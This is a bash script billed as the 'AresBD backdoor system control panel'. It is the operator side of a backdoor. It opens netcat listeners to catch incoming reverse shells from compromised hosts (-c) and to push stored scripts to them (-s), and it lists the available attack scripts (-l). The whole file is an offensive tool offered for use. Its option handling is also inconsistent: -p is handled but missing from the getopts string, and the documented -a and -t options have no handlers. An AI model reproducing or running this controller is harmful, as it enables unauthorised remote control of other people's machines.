#!/bin/bash
#AresBD backdoor system control panel

#if [[ $UID != 0 ]]; then
#    echo "Please run this script with sudo."
#    exit 1
#fi

clear

#Read config file
source ~/Ares/ares.conf

clear
echo ===========================================================
echo "                         ____  _____                     ";
echo "     /\                 |  _ \|  __ \                    ";
echo "    /  \   _ __ ___  ___| |_) | |  | |                   ";
echo "   / /\ \ | '__/ _ \/ __|  _ <| |  | |                   ";
echo "  / ____ \| | |  __/\__ \ |_) | |__| |                   ";
echo " /_/    \_\_|  \___||___/____/|_____/ ____   _____ ______";
echo " | |            / ____|__   __/ ____|/ __ \ / ____|___  /";
echo " | |__  _   _  | (___    | | | (___ | |  | | (___    / / ";
echo " | '_ \| | | |  \___ \   | |  \___ \| |  | |\___ \  / /  ";	
echo " | |_) | |_| |  ____) |  | |  ____) | |__| |____) |/ /__ ";
echo " |_.__/ \__, | |_____/   |_| |_____/ \____/|_____//_____|";
echo "         __/ |                                           ";
echo "        |___/                                            ";
echo ===========================================================
sleep .1

while getopts ":c: :h :l :s:" opt; do
  case $opt in
    
	h)
		echo "sudo $(basename "$0") [-h][-l][-a][-c][-p <port>][-s <name>]-- AresBD backdoor system control panel.
		
Usage: sudo $(basename "$0") -p <port> 
Options:
    -c			Initiate connection to remote host
	-p <port>	Port for remote connections
	-t			Activate Taranis
    -h			Show this message
    -l			List available scripts
    -s <name>	Execute a script"	
      ;;

	l)
        echo "Scripts: "
		ls ~/Ares/Scripts
		echo ""
	  ;;
	  
    s)
	    echo "Please enter the server listening port: "
        echo "Connecting..."
        nc -l -p $PORT < ~/Ares/Scripts/$OPTARG
        echo ""
      ;;

    c)
		echo 'Connecting to remote shell. You may need to wait for the remote client to initiate the connection...'
    	nc -l -p $PORT >&2
        echo ""
      ;;
	  
    p)
		PORT=$OPTARG
	  ;;
	

    \?)
    	echo "Invalid option: -$OPTARG" >&2
    	exit 1
    ;;

    :)
    	echo "Option -$OPTARG requires an argument." >&2
    	exit 1
      ;;
  esac
done

if [ $OPTIND -eq 1 ]; then aresbd -h; fi
    shift $OPTIND
